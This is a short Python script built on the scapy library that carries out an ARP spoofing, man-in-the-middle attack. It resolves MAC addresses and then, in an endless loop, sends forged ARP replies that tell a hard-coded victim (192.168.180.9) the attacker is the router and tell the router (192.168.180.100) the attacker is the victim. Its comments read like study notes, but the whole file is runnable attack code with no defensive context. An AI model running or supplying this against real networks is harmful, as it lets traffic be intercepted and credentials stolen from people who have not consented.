#!/usr/bin/env python
import time
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # with this function, scapy.srp() we send packets and receive the answer
    # [0] is set as we need just the first list only.
    #  With verbose=false the top of the information is not printed out
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc  # Retrieving the mac-address of the ip given


def spoof(target_ip, spoof_ip):
    # op=2 to creat an ARP response
    # pdst -> ip target the one to fool
    # hwdst -> mac target the one to fool
    # psrc -> ip to simulate
    # For more info print(packet.show())
    # For more info print(packet.summary())
    return scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)  # , hwsrc="08:00:00:00:00:3c")


while True:
    scapy.send(spoof("192.168.180.9", "192.168.180.100"))  # telling the victim we're the router
    scapy.send(spoof("192.168.180.100", "192.168.180.9"))  # telling the router we're the victim
    time.sleep(2)

